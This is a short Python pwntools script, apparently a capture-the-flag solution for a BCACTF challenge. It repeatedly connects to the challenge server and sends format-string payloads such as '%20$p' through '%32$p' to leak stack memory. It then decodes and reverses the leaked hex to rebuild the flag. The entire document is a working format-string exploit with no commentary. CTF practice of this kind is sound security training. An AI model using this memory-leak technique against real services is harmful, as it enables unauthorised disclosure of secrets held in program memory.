#!/usr/bin/python3
from pwn import *
context.log_level = 'critical'
host = "bin.bcactf.com"
port = 49157
flag = ""
for i in range(20,33):
    s = remote(host, port)
    s.recvuntil(b"Let's see it!")
    s.sendline("%"+str(i)+"$p")
    (s.recvuntil(b'0x'))
    if (i == 32):
        flag = flag + (bytes.fromhex(s.recv()[6:12].decode('ascii')).decode('ascii')[::-1])
        break
    flag = flag + (bytes.fromhex(s.recv()[:16].decode('ascii')).decode('ascii')[::-1])
print(flag)
